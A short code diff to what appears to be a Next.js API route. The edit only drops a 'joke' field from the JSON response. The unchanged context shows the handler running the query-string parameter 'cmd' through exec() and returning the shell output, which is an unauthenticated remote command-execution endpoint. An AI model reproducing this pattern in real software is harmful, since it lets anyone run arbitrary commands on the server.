@@ -10,6 +10,6 @@ export default async function handler(
   const { cmd } = query
 
   exec(cmd, (_: any, output: any) => {
-    res.status(200).json({ joke: 'Hello World', cmd, data: output.split('\n') })
+    res.status(200).json({ cmd, data: output.split('\n') })
   })
 }
